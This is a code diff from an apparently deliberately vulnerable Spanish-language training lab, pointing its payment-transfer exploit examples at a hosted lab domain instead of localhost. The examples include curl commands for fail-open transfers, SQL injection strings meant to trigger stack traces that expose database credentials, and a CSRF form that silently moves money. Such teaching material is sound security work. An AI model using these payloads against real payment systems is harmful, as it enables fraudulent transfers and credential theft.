@@ -47,13 +47,13 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
             <p class="mb-0"><small>CSRF es una vulnerabilidad historica incluida por completitud pedagogica.</small></p>
         ',
         'exploit' => '# 1. Failing open
-curl -X POST http://localhost:8082/a10_pagos/transferir.php -d "to_user=999&amount=100"
+curl -X POST https://nexolab.guajilodev.com/a10_pagos/transferir.php -d "to_user=999&amount=100"
 
 # 2. Stack trace
-curl -X POST http://localhost:8082/a10_pagos/transferir.php -d "to_user=\' OR 1=1--&amount=100"
+curl -X POST https://nexolab.guajilodev.com/a10_pagos/transferir.php -d "to_user=\' OR 1=1--&amount=100"
 
 # 3. CSRF - Un atacante pone esto en su sitio:
-<form action="http://nexo.com/a10_pagos/transferir.php" method="POST">
+<form action="https://nexolab.guajilodev.com/a10_pagos/transferir.php" method="POST">
   <input type="hidden" name="to_user" value="666">
   <input type="hidden" name="amount" value="50000">
 </form>
@@ -79,14 +79,14 @@ curl -X POST http://localhost:8082/a10_pagos/transferir.php -d "to_user=\' OR 1=
             <div class="card-header bg-dark text-white">Ejemplos con curl</div>
             <div class="card-body">
                 <h6>1. Failing Open (transferencia a usuario inexistente):</h6>
-                <pre class="vulnerable p-3"><code>curl -X POST http://localhost:8082/a10_pagos/transferir.php \
+                <pre class="vulnerable p-3"><code>curl -X POST https://nexolab.guajilodev.com/a10_pagos/transferir.php \
   -d "to_user=999&amount=100"
 
 # Respuesta: {"status":"success","message":"Transferencia completada"}
 # Pero el usuario 999 NO existe!</code></pre>
                 
                 <h6 class="mt-4">2. Stack Trace (provocar error de SQL):</h6>
-                <pre class="vulnerable p-3"><code>curl -X POST http://localhost:8082/a10_pagos/transferir.php \
+                <pre class="vulnerable p-3"><code>curl -X POST https://nexolab.guajilodev.com/a10_pagos/transferir.php \
   -d "to_user='; SELECT * FROM users--&amount=100"
 
 # Respuesta: Stack trace completo con credenciales de la BD</code></pre>
